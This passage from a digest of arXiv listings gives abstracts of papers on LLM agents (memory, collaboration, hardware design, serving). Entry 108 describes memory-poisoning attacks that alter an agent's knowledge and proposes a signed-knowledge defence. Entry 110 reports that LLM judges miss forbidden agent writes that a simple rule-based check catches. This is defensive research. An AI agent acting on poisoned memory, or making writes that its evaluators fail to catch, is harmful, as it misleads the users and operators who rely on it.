LLM agents increasingly operate in long-horizon, verifier-rich environments, but current self-improvement mechanisms often write episode-derived lessons directly into memory, making local success an unreliable signal for reusable and safe knowledge. This paper addresses the core question of when an experience-derived behavioral update should be admitted into persistent agent state. We propose Falsification-Gated Self-Evolution (FGSE), a verifier-grounded framework that represents each candidate lesson as a structured hypothesis with an explicit precondition, behavior change, expected effect, and verifier. FGSE applies the hypothesis only in a temporary state, tests it on target-transfer, falsification, and archived-regression probes, and then commits, refines, or rejects it according to measured gain and risk. Across web, app, tool-use, and long-term memory benchmarks, FGSE achieves strong task performance, including 39.8 WebArena success rate, 78.8 AppWorld average completion, and 0.724/0.487 Pass$^1$ on $τ$-Retail/$τ$-Airline, while reducing falsification failures to 5.0%, regression damage to 1.3%, and harmful committed updates to 3.6%. These results suggest that testing memory updates as hypotheses supports more reliable long-term adaptation.

</details>


### 96. Don't Just Trust Your Memory: Evidence-Linked Memory Reduces Memory-Induced Degradation in LLM Agents

- **Authors:** Yukyeong Lee, Yumin Choi, Jinheon Baek, Sung Ju Hwang
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14320v1](http://arxiv.org/abs/2611.14320v1)
- **PDF:** [https://arxiv.org/pdf/2611.14320v1](https://arxiv.org/pdf/2611.14320v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

External memory enables LLM agents to improve from experience by distilling trajectories of past tasks into concise lessons for new tasks. However, memory can also lead to memory-induced degradation, where an agent fails on tasks it would solve without memory, often because it follows a lesson that is incorrect, or misapplies or misreads a valid one. This is because lessons are inferred from trajectories labeled only with task success or failure, yet are typically provided without the trajectories they came from, leaving the agent no way to check them. To address this, we introduce WikiTrace, an evidence-linked memory system designed to let agents check each lesson against its original trajectory. Specifically, motivated by the finding that a trajectory often still holds the evidence needed to catch an erroneous lesson, WikiTrace stores each lesson as a concise insight linked to a summary of why its trajectory succeeded or failed and to the raw trajectory itself. Then, on a new task, the agent starts from all insights and, whenever one lacks details needed to act, conflicts with another, or comes from a failed task, descends through its links with terminal tools to fill in missing details or correct the insight before acting. We validate WikiTrace on five agentic benchmarks, showing that it consistently outperforms existing memory approaches and a baseline given the same insights alone, while also reducing memory-induced degradation. Our code is available at https://github.com/yukyeongleee/wikitrace

</details>


### 97. Lilo: A Multi-Agent Conversational Sandbox for Children's Digital Communication

- **Authors:** Ofri Elbaum, Amit Malik, Tomer Malkevich, Zohar Elyoseph, Adir Solomon, Rotem Dror, Oshrat Ayalon
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14260v1](http://arxiv.org/abs/2611.14260v1)
- **PDF:** [https://arxiv.org/pdf/2611.14260v1](https://arxiv.org/pdf/2611.14260v1)
- **Categories:** cs.HC, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Children's peer conflicts increasingly play out in group chats, where tone and timing are stripped away, and a hurtful message is easier to send than to say aloud. We present Lilo, a multi-agent conversational system that lets children practice such conversations, so they are better prepared when they encounter them in real digital communication. In Lilo, the child joins two AI-driven peers mid-argument, coached by a mentor character, also named Lilo, through a Stop-Think-Act traffic light. Through an exploratory study with 28 children (aged 9-11), we examine how children engage with Lilo's simulated peer conflict and the mentor's traffic-light interventions. The study included an intervention with Lilo, surveys before and after the intervention, and exit interviews. Participants reported significantly higher self-efficacy for coping with unpleasant messages after their interaction with Lilo. They felt safe experimenting, knowing nothing they wrote would be held against them.

</details>


### 98. PARLEY: Evaluating LLM Collaboration Through Cooperative Asymmetric Puzzles

- **Authors:** Javier Hernandez, Andrew D. Wilson
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14242v1](http://arxiv.org/abs/2611.14242v1)
- **PDF:** [https://arxiv.org/pdf/2611.14242v1](https://arxiv.org/pdf/2611.14242v1)
- **Categories:** cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

As large language models power autonomous agents, understanding how they collaborate and where they fail becomes critical. We introduce PARLEY, an extensible platform for studying LLM agent collaboration through four asymmetric puzzle tasks grounded in cognitive psychology (referential communication, joint coordination, perspective-taking, and spatial reasoning). GPT-4o agent pairs succeeded in 60.5% of conversations (N=400, 100 per task), with task-level variation (34-80%) reflecting distinct collaborative demands. From these conversations, we derived the data-driven PAC taxonomy: six failure types organized into Perception (visual interpretation and spatial reasoning), Adaptation (progress tracking and feedback integration), and Coordination (verification and grounding). Failure to incorporate external feedback was a critical indicator of unsuccessful collaboration, with agents repeatedly applying unsuccessful strategies. We also show that a taxonomy-guided intervention (N=200) improved average task success to 70.5%. These results demonstrate how PARLEY can be used to derive meaningful, data-driven insights that can in turn lead to improved agentic collaboration.

</details>


### 99. Verifiable Agentic Traffic Class: A Policed Quality-of-Service Mechanism for Agentic AI Traffic, Evaluated from Simulation to Real-Kernel Adversarial Testing

- **Authors:** Naveen Babu Narayanan Nair, Sajay Kurup
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14211v1](http://arxiv.org/abs/2611.14211v1)
- **PDF:** [https://arxiv.org/pdf/2611.14211v1](https://arxiv.org/pdf/2611.14211v1)
- **Categories:** cs.LG, cs.AI, cs.NI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Software agents built on large language models generate traffic unlike human web traffic, yet routers have no class for it and cannot verify a sender's claim to be an agent. This paper proposes the Verifiable Agentic Traffic Class (VATC), which combines a reserved Differentiated Services Code Point (DSCP) value declaring agent traffic, a router-side classifier that demotes flows contradicting the declaration to a class served after best-effort traffic, and a rate-limited priority queue. VATC was compared with static Differentiated Services (DiffServ), a dedicated class that trusts the marking, and fq_codel, a per-flow fair-queuing scheduler, in two simulators and on a real Linux kernel. VATC matched DiffServ under steady load. In a constructed burst it cut mean agent queuing delay by 98% relative to DiffServ in simulation (assuming an immediate verdict), at a 12% increase in human delay; most of the gain came from the separate class. Under a spoofed flood in the kernel, the rate limit held human latency 11 times below DiffServ's. Without verification, DiffServ and a tightly configured fq_codel gave legitimate agents lower latency than VATC; a live four-feature classifier then demoted all 20 bulk-shaped spoofers and gave agents 0.30 ms, but missed six spoofers that copied the agent pattern. With emulated network delay, a timing feature of the classifier stopped separating agent from human flows. In real agent harnesses on a congested link, router queueing took 13% to 63% of task time, depending on harness and assumed model latency. The traffic was synthetic or sandbox-scale.

</details>


### 100. Tree-Ising: Repairing Language Models with Bit-Level Ising Edits

- **Authors:** Hadi Salloum, Ammar Ali
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14210v1](http://arxiv.org/abs/2611.14210v1)
- **PDF:** [https://arxiv.org/pdf/2611.14210v1](https://arxiv.org/pdf/2611.14210v1)
- **Categories:** cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Weight-space programming, introduced in recent MIT work by Takehi et al., enables a frontier LLM agent to read a network's weights and write a repair. Their GPT-6 Astra agent corrected the reasoning loops of Qwen3.5-0.8B without gradients, using 158 agent turns, 89.7 million tokens, and 50 forward-pass requests. Our method, Tree-Ising, casts this repair as a sparse discrete optimization problem over the model's own BF16 weights. Forward statistics define an objective that weakens a loop direction, strengthens a concluding direction, and preserves the layer's output on productive tokens. Within a state-tree representation, where lossless BF16 storage acts as a special case, the admissible edits are sign flips and exponent shifts that preserve all shared group exponents and mantissas. We decompose this objective exactly into independent QUBO (Ising) problems, one per output row, which we solve on a GPU using simulated annealing or quantum-inspired simulated bifurcation. On the agent's two layers, Tree-Ising achieves 54.6% on MATH-500, outperforming the agent's edit (51.7%) under the same evaluation protocol, while the base model scores 7.9% as reported. The simulated bifurcation solver yields a statistically indistinguishable repair at 55.1%. Both solvers outperform the agent edit across all five math benchmarks, with statistically significant improvements on MATH-500 and GSM8K after correcting for multiple comparisons. Our approach modifies 13% to 17% fewer weights and reduces BF16 bit flips by a factor of 2.2 to 2.3. It requires only four forward-pass requests and zero LLM tokens, with the annealing recipe costing about $0.90 in GPU time. On Qwen3.5-2B, with layers and dose selected using only the base model, the same recipe increases greedy GSM8K accuracy from 21.6% to 69.4%. As a proof of concept, we execute an eight-variable repair subproblem using QAOA on an IBM Heron processor.

</details>


### 101. What a CAGE 4 Score Measures: An Audit of a Learned Cyber-Defense Benchmark, Its Reference Defenders, and the Tables Built on Them

- **Authors:** James Rice, Ji Hwan Park, Andres Kwasinski
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14068v1](http://arxiv.org/abs/2611.14068v1)
- **PDF:** [https://arxiv.org/pdf/2611.14068v1](https://arxiv.org/pdf/2611.14068v1)
- **Categories:** cs.CR, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

CAGE Challenge 4 is the benchmark on which learned multi-agent cyber defenders are compared. We reproduce its two reference defenders, KEEP and H-MARL Expert, in a pinned container and show that three things read from it measure less than they are taken to measure. First, the simulator silently discards any action asserted for an agent whose previous action is still running, and charges one point for a discarded Restore as for one that runs. The documented observation does not expose the busy flag. Both reference defenders read it in their own wrappers, and switching that check off at evaluation costs KEEP's released policy 99.58 points per episode and H-MARL's 145.98, in both cases the charge for Restores sent to busy agents, with H-MARL's executed actions unchanged step for step. On a supervisory harness, holding interventions until the agent is idle is worth 25.3 and 27.6 points per episode at the published setting. In training, the check decides how a busy step enters the trajectory. Trained without it, KEEP leads at a hundred updates in all four paired seeds and trails from two hundred on in all four. Continued to two thousand updates on three seeds, the repaired recipe ends inside the released interval on one seed and short on two, by 27 and 125 points, a spread across training seeds far wider than the released reproduction interval. Second, the evaluation seeds the environment but not the policy, so a reported mean is one draw, and 88.9% of per-episode outcome variance is the policy's own sampling draw. Third, recovery precision depends on the truth it is scored against. Across five published comparison tables, none states the artifact, sampling, criterion and adversary that would make its numbers comparable. We release the instrument, our patches to both defenders, the traces and checkpoints behind every number, and a five-item disclosure checklist.

</details>


### 102. Program-Aided Patchable Skill Evolution

- **Authors:** Jiahao Wang, Yuqi Xiong, Qing Yang, Zhipeng Xu, Zhenghao Liu, Zulong Chen, Yubin Bao
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14019v2](http://arxiv.org/abs/2611.14019v2)
- **PDF:** [https://arxiv.org/pdf/2611.14019v2](https://arxiv.org/pdf/2611.14019v2)
- **Categories:** cs.CL, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Agent skills have emerged as an effective means of enabling LLM agents to solve complex, interactive tasks by encoding reusable knowledge without modifying model parameters. Recent approaches further improve skill adaptation by distilling reusable experience from agent execution trajectories and evolving skills based on downstream task feedback. However, existing methods primarily represent skills as natural language documents, intertwining procedural logic with descriptive knowledge and making skills difficult to maintain and evolve. To address this limitation, we propose PASE (Program-Aided Patchable Skill Evolution), a program-aided framework that iteratively evolves skills by associating them with executable programs. Unlike prior approaches that encode trajectory-derived experience primarily in natural language, PASE separates reusable procedural logic into editable programs, enabling targeted updates to executable components while reducing the need to repeatedly revise natural language skills. Extensive experiments across diverse models and benchmarks demonstrate that PASE consistently outperforms all baselines, by achieving over 2.8% improvements. Further analyses show that PASE exhibits greater evolutionary stability and generalisation capability, highlighting the critical role of programmatic knowledge in skill evolution. We will release all data and code via GitHub.

</details>


### 103. Controlled Knowledge Engineering for Taxonomy Induction with Tool-Grounded LLM Agents and Runtime-Adaptive Policies

- **Authors:** Jonas Limniatis, Bennet Schaarmann, Georg Reuber, Robert Stahlbock
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13966v1](http://arxiv.org/abs/2611.13966v1)
- **PDF:** [https://arxiv.org/pdf/2611.13966v1](https://arxiv.org/pdf/2611.13966v1)
- **Categories:** cs.IR, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Taxonomies are structured knowledge representations that support semantic search, recommendation, product catalog organization, and retrieval-augmented generation. Their automated construction from a fixed set of candidate entities requires more than plausible text generation: the resulting hierarchy must be complete, structurally valid, and semantically coherent. Large Language Models (LLMs) are promising for this task, but iterative free-form generation remains vulnerable to omitted or hallucinated entities, invalid hierarchical relations, and inconsistent organizational principles. We introduce TIGA (Taxonomy Induction with Tool-Grounded Agents), a knowledge-engineering architecture that formulates taxonomy induction as an iterative decision process over an explicit state and constrained action space. TIGA combines executable taxonomy-editing tools, an memory that records tool calls, rationales, and outcomes, and a runtime-adaptive organizational policy that the agent revises during inference. An optional global reviewer evaluates the constructed taxonomy against the candidate set and the active policy. We evaluate TIGA on four benchmark taxonomies using two LLM backbones and compare it with single-shot and iterative prompting-based baselines. TIGA achieves the strongest structural-quality results in most evaluated configurations, but does not dominate on every precision measure. The gains are accompanied by substantially higher token consumption, API-call volume, and inference time. Ablation results show consistent benefits from the policy and interaction-memory components, whereas the effect of global review depends on the dataset and the available revision budget. These findings characterize tool grounding and runtime policy adaptation as promising but costly mechanisms for improving the controlled construction of structured knowledge representations.

</details>


### 104. Safety and Connectivity Certificates for Finite-Time Formation Transitions

- **Authors:** Yash Purswani, Shivansh Agarwal, Anuj Tiwari
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13927v1](http://arxiv.org/abs/2611.13927v1)
- **PDF:** [https://arxiv.org/pdf/2611.13927v1](https://arxiv.org/pdf/2611.13927v1)
- **Categories:** eess.SY, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Finite-time formation transitions are useful for coordinating multi-agent systems in time-critical missions, but convergence to a prescribed formation in finite time does not guarantee collision avoidance or communication connectivity during the transition. Existing approaches address finite-time coordination and safety-constrained formation control, yet explicit connections between disagreement during transitions, formation geometry, and coupling-gain selection need to be developed for certifying safe maneuvers. This paper develops a disagreement-based framework for certifying transient safety and connectivity during finite-time tracking of arbitrary prescribed formation trajectories. Local feedback guarantees exact finite-time tracking with a graph-independent settling-time bound, while a graph-dependent disagreement bound is used to derive sufficient geometric conditions for collision avoidance and connectivity preservation. These conditions further yield an offline coupling-gain selection rule based on the available geometric clearance. Numerical simulations illustrate the trade-off between convergence rate and control effort as the coupling gain increases. They also demonstrate the effectiveness and conservatism of the proposed certificates.

</details>


### 105. Toward Autonomous RTL and Synthesis Optimization: Benchmarking and Self-Improving Agents

- **Authors:** Wenji Fang, Yao Lu, Jinghua Wang, Zhiyao Xie
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13713v1](http://arxiv.org/abs/2611.13713v1)
- **PDF:** [https://arxiv.org/pdf/2611.13713v1](https://arxiv.org/pdf/2611.13713v1)
- **Categories:** cs.AI, cs.AR


> Summary unavailable.


<details>
<summary>Abstract</summary>

Recent advances in large language models (LLMs) and autonomous agents are creating new opportunities for hardware design optimization. This paper examines three connected directions toward autonomous RTL and synthesis optimization: (1) Realistic benchmarking. We discuss reference-based and open-ended RTL optimization benchmarks that evaluate optimization opportunities under realistic EDA workflows. (2) Tool-grounded RTL optimization. We present Dr. RTL, a multi-agent framework that automates critical-path analysis, RTL rewriting, and implementation-level evaluation, while continuously improving through reusable optimization skills. Evaluated on 20 real-world RTL designs, Dr.~RTL achieves average WNS/TNS improvements of 21\%/17\% with a 6\% area reduction over commercial synthesis. (3) Design-specific synthesis optimization. We explore agent-driven synthesis script tuning and the discovery of executable synthesis algorithms across intermediate representations, technology-independent optimization, and technology mapping. Finally, we envision AI-native design automation that jointly explores architectural, RTL, and EDA algorithm design spaces, guided by verification constraints and implementation feedback.

</details>


### 106. AutoManifold: Agentic Design of Data Visualisation Algorithms via Manifold Embedding

- **Authors:** Burak Susam, Ruiyuan Kang, Tingting Mu
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13710v2](http://arxiv.org/abs/2611.13710v2)
- **PDF:** [https://arxiv.org/pdf/2611.13710v2](https://arxiv.org/pdf/2611.13710v2)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Manifold embedding for data visualisation is dominated by a small set of hand-designed state-of-the-art (SOTA) algorithms. Their design targets are fixed at development time, resulting in inflexible algorithmic behaviour that cannot be readily steered towards user-specified structural priorities. Hand-designing new embedding algorithms to address user priority requires highly specialised expertise and is time consuming. To address autonomous algorithm design tailored to user preference, we introduce an agentic algorithm generation pipeline AutoManifold. It composes new manifold embedding algorithms from a constrained vocabulary of affinity, cost, and optimisation primitives, supported by multi-agent large-language-model (LLM) orchestration. AutoManifold conditions every stage of its design on user-specified structural preservation preferences, and iteratively refines the algorithm configuration through an LLM-guided, metric-grounded iterative loop. We compare the generated algorithms against the three strongest and most frequently used SOTA methods (t-SNE, UMAP, and PaCMAP) on real-world datasets spanning different difficulty regimes under identical evaluation infrastructure. The results demonstrate that LLM-driven, priority-conditioned algorithm synthesis can move beyond hyperparameter tuning, producing genuinely new algorithms that outperform traditional hand-designed methods in their ability to steer towards user-specified properties without compromising the intrinsic structure in the original data. The code of AutoManifold is available at https://github.com/buraksusam/AutoManifold_NeurIPS2026.

</details>


### 107. Agentic AI Meets Formal Verification in the Era of Agentic Hardware Development

- **Authors:** Wenji Fang, Yuchao Wu, Jing Wang, Zhiyao Xie
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13705v1](http://arxiv.org/abs/2611.13705v1)
- **PDF:** [https://arxiv.org/pdf/2611.13705v1](https://arxiv.org/pdf/2611.13705v1)
- **Categories:** cs.AI, cs.AR


> Summary unavailable.


<details>
<summary>Abstract</summary>

As AI agents become increasingly capable of generating and optimizing hardware circuits, ensuring the correctness of AI-generated designs becomes more important. Meanwhile, advances in AI lower the barriers to developing and applying formal methods, creating new opportunities to automate and improve hardware verification. This invited paper presents an overview of the methodologies and applications of hardware formal methods in the AI era. First, we examine how agentic AI advances hardware formal methods across three levels: specification, proof construction, and reasoning engines. Second, we discuss how formal methods support reliable AI-driven hardware development through RTL generation, debugging, and correctness-preserving optimization. We review representative research alongside our recent contributions, highlighting key technical advances and insights from experimental results. Finally, we discuss future research opportunities toward proof-native hardware development, where formal reasoning could become an integral part of autonomous hardware design.

</details>


### 108. On Private Knowledge Retrieval and Private Inference for secure multi-agent systems

- **Authors:** Vicenç Torra, Maria Bras-Amorós
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13696v1](http://arxiv.org/abs/2611.13696v1)
- **PDF:** [https://arxiv.org/pdf/2611.13696v1](https://arxiv.org/pdf/2611.13696v1)
- **Categories:** cs.CR, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Multi-agent systems provide a convenient framework for the massive deployment of agents based on Large Language Models (LLMs). It provides a sound framework where agents can interact with existing software to perform actions in an autonomous way. Agentic AI is the new term to denote these AI-based autonomous systems.
  In real multi-agent systems, agents need to deal with malicious agents some of which can exploit security vulnerabilities to do harm. A memory poisoning attack is an example of exploiting a vulnerability to modify agents knowledge and, thus, affect its behavior. In an agent, there are different types of memory systems (semantic, episodic, and short-term) which have their own characteristics and for which different memory poisoning attacks may be developed.
  In this paper we focus on semantic memory, we discuss its attack, and mitigation strategies. We introduce private knowledge retrieval and private inference. We propose a signature system in the knowledge base to prevent from undesired manipulation. This should avoid memory poisoning attacks by introducing security by design in the construction of the semantic memory. In our architecture, an agent contains a local Prolog-like inference system (i.e., using Horn clauses to represent knowledge) which accesses an external knowledge base to get the required knowledge. This externally signed knowledge base is accessed privately. We provide different implementations in Python using different privacy levels including k-anonymity and information-theoretical privacy (IT-PIR).

</details>


### 109. DrugCoding: A Scientific Programming Agent for Drug Discovery

- **Authors:** Junwei Hu, Zhuohao Lin, Kun Li, Hengnan Zhang
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13651v2](http://arxiv.org/abs/2611.13651v2)
- **PDF:** [https://arxiv.org/pdf/2611.13651v2](https://arxiv.org/pdf/2611.13651v2)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Drug discovery involves multiple interconnected research stages, including molecular design, property prediction, and virtual screening. These processes are characterized by complex workflows, interdependent computational tasks, and diverse specialized tools, placing substantial demands on the coordination of scientific models and computational resources. However, existing large language model (LLM)-based scientific agents still face challenges in autonomous planning of complex tasks, adaptive selection of specialized models, and reliable execution of multi-stage scientific computations, limiting their effectiveness in automating complex drug discovery workflows. To address these challenges, we propose DrugCoding, a scientific programming agent system that integrates scientific task planning, adaptive model routing, multi-agent collaboration, and programmatic tool execution. DrugCoding enables autonomous task planning and dynamic model adaptation for complex research objectives. It can flexibly invoke specialized scientific models, autonomously generate and execute code according to task requirements, and leverage multi-agent collaboration to support efficient execution and reliable validation of complex scientific tasks. To evaluate DrugCoding's performance in scientific tool invocation and multi-stage task execution, we conduct multi-turn tool-calling experiments across diverse language models and scientific tool interfaces. Experimental results demonstrate that DrugCoding achieves an average session-level Pass@1 of 97.35% on the full benchmark, outperforming the strongest baseline, Codex, by 9.24%. On the challenging subset, DrugCoding achieves 97.92%, exceeding the strongest baseline.

</details>


### 110. When Evaluators of AI Agents Disagree: An Empirical Study of Native Scoring, LLM Judges, and Commit-Boundary Checks on tau2-bench

- **Authors:** Sungbin Im
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.14581v1](http://arxiv.org/abs/2611.14581v1)
- **PDF:** [https://arxiv.org/pdf/2611.14581v1](https://arxiv.org/pdf/2611.14581v1)
- **Categories:** cs.SE, cs.AI, cs.CR


> Summary unavailable.


<details>
<summary>Abstract</summary>

Agentic workflows, in which a large language model (LLM) calls tools to read and write data, are evaluated in two ways. Benchmarks compare the final state against a gold answer. Deployed services have none; an LLM judge reads the transcript and decides. Practice treats the two as interchangeable. This paper measures whether they are.
  We ran 2,160 episodes in tau2-bench's airline and retail domains and recorded every database write. We scored each episode four ways: native scoring against gold state, an LLM judge, that judge given the policy document, and the boundary evaluator, a minimal rule-based check of whether a write was expected against whether one occurred in the trace. Two annotators independently labeled 120 episodes for task correctness, policy compliance, and commitment correctness.
  The judge repeated its verdict 98.2% of the time but agreed with native scoring on 56.2%. In 11 episodes the agent executed a forbidden write. The judge passed 10 to 11, with or without the policy or transcript. A stronger judge still passed 6. The boundary evaluator, with no model call, caught all 11; no judge significantly exceeded it on human labels. Forbidden writes occurred in 11.1% of episodes without gates. Verification, correction, and safe-termination gates did not reduce them significantly. The traces show a candidate cause: the gates' evidence digest dropped the order status and customer authentication, so valid requests were rejected. The choice of evaluator decides the conclusion; the minimal check exposes failures the judges miss. Traces, code, prompts, and labels are released.

</details>


### 111. Deep Personalization: Continuous Context Observation for Local Proactive Agents

- **Authors:** Yijia Shao, Song Bian, Junxian Guo, Jindong Jiang, Zhen Dong, Huizi Mao, Diyi Yang, Song Han
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13457v1](http://arxiv.org/abs/2611.13457v1)
- **PDF:** [https://arxiv.org/pdf/2611.13457v1](https://arxiv.org/pdf/2611.13457v1)
- **Categories:** cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

As AI agents become increasingly capable, users must still recognize when and how to ask for help, leaving many opportunities for useful support unrealized. Proactive agents hold the promise to close this gap, but effective proactivity requires understanding users' real-time activities and personalizing intervention timing so that assistance is offered when it is likely to be helpful rather than disruptive. We introduce deep personalization, a closed-loop process that connects continuous context observation with continual agent adaptation: an agent observes user activity, selectively retains long-term context, and adapts intervention decisions from implicit feedback. We initiate deep personalization in Coco, a proactive desktop agent, by having a separate Observer Agent that monitors desktop activity, maintains compact long-term user modeling context, and learns when assistance is desirable from implicit signals such as engagement, dismissal, explicit requests, and repeated work patterns. We further develop efficient on-device strategies to enable the Observer Agent to run on local AI compute platforms without streaming raw activity data off-device. For evaluation at scale without collecting sensitive real-user activity, we introduce a data-synthesis pipeline that transforms existing computer-use trajectories into OSWorld-Persona, a benchmark with persona-conditioned intervention labels. On OSWorld-Persona, deep personalization improves macro F1 across three model backbones from 0.12-0.19 under direct prompting to 0.35-0.48 after adaptation, a 2.4-3.0x relative gain. In a week-long user study, we observe that Coco improves its macro-averaged F1 score from 0.199 to 0.515. These results suggest that on-device deep personalization can make proactive agents more timely and increasingly aligned with each user's everyday work.

</details>


### 112. SafeRoute-MAS: Coverage-Aware and Risk-Calibrated Message Routing for Multi-Agent Scientific Reasoning

- **Authors:** Zhiming Xue, Jianan Liu, Weiran Yan, Aicheng Xie, Jing Yang
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13454v1](http://arxiv.org/abs/2611.13454v1)
- **PDF:** [https://arxiv.org/pdf/2611.13454v1](https://arxiv.org/pdf/2611.13454v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

We introduce SafeRoute-MAS, a coverage-aware, risk-calibrated procedure that keeps all specialist messages or removes one using only pre-integration information. On a sealed cache of 5,328 committees, its source-compatible operating point gains +1.80 percentage points (95% CI [+1.13, +2.52]) while removing 12.76% of message tokens. We also run 4,580 controlled integrations over a stratified 458-committee sample on a public gpt-oss-120b endpoint. The sample estimate is -0.09 points; design weighting to the original workload gives +0.94 points (95% CI [-1.31, +3.50]) and 18.72% acted-input reduction. A weighted token-matched comparison likewise does not establish a selector advantage (+1.68 points, CI [-1.27, +5.10]). Only 13 of 88 cached non-neutral labels (14.8%) retain direction by repeated-call majority. Expected-corruption UCL is 4.60% after weighting, but only 2 of 11 prespecified marginals pass the support/risk rule. We therefore propose a numerical qualification with Keep-All fallback, applied here retrospectively rather than validated prospectively.

</details>


### 113. BioMem: Agentic Memory for Biomedical LLM Agents

- **Authors:** Mingchen Li, Yongkang Xiao, Rumeng Li, Rui Zhang, Hong Yu
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13426v1](http://arxiv.org/abs/2611.13426v1)
- **PDF:** [https://arxiv.org/pdf/2611.13426v1](https://arxiv.org/pdf/2611.13426v1)
- **Categories:** cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Large language models (LLMs) have demonstrated considerable potential in biomedical applications, while agentic memory systems have emerged as a promising approach to preserving and utilizing information across tasks and interactions. However, a fundamental question remains: how effectively and reliably do these systems retain, retrieve, update, and utilize biomedical information? In this study, we systematically investigate agentic memory in the biomedical domain, focusing on task effectiveness, retrieval quality, information fidelity, and long-term robustness. We evaluate five memory approaches across four LLMs in three representative settings: biomedical knowledge reasoning, clinical prediction, and long-term conversational memory. Our analyses reveal how memory construction, evidence relevance, and conversational history shape downstream biomedical performance, highlighting the distinct challenges of retrieving relevant information, preserving its fidelity, and effectively utilizing it for reasoning. Building on these findings, we introduce Hybrid Memory Retrieval and Utilization (HMRU), a training-free framework that jointly enhances evidence accessibility and task-aware utilization to improve biomedical reasoning and long-term conversational memory. HMRU achieves an average relative improvement of 8.6% across biomedical question-answering and conversational memory benchmarks, with additional gains in selected clinical prediction tasks. It further reduces conversational answer errors by 24.9% and closes 48.0% of the performance gap to full-context inference. Our findings provide a systematic characterization of biomedical agentic memory and practical insights into developing more effective and reliable memory-augmented LLM systems.

</details>


### 114. Bursts That Outlast Themselves: Persistent Degradation in Prefix-Cached Agent Serving

- **Authors:** Wen Huang, Jack Liu
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13412v1](http://arxiv.org/abs/2611.13412v1)
- **PDF:** [https://arxiv.org/pdf/2611.13412v1](https://arxiv.org/pdf/2611.13412v1)
- **Categories:** cs.DC, cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

LLM agents drive inference engines with closed-loop sessions whose context grows every turn, and serving them economically depends on prefix caching: a hit costs an incremental prefill of about a thousand tokens, a miss recomputes a 10--40K-token context. We show that this makes prefix-cached agent serving metastable. With an identical base workload, a few minutes of extra arrivals leaves a vLLM server in a degraded regime--a ~10% hit ratio, about half the throughput, and a backlog that grows for the remaining 70 minutes--while its no-burst twin stays healthy (9 of 12 pairs; none in the reverse direction). The regime appears at loads the cache-warm server sustains, is absent without prefix caching, and also appears with Qwen3-32B on SWE-bench agent trace shapes and on SGLang, which tolerates larger triggers. Slower service keeps more sessions in the system, their working set outgrows the KV pool, and every turn becomes a recomputation; a first-order workload-balance condition, calibrated independently, brackets when the regime can drain. Getting out is the harder problem: throttling new admissions recovered 1 of 7 matched collapsed runs, while suspending admitted sessions against a capacity-based limit recovered all of them within minutes. A CPU offload tier delays the collapse but does not prevent it. A budgeter that bounds the resident KV demand of active sessions to the pool, with thresholds that need no per-workload tuning, prevented the failure in every run we tested.

</details>


### 115. SteerDistill: Quantizing LLM Agents via Closed-Loop Teacher Steering

- **Authors:** Genming Cui, Xiangyu Li, Zixu Hao, Xin Ding, Yunxin Liu, Ting Cao
- **Published:** 2026-11-10
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.13410v1](http://arxiv.org/abs/2611.13410v1)
- **PDF:** [https://arxiv.org/pdf/2611.13410v1](https://arxiv.org/pdf/2611.13410v1)
- **Categories:** cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

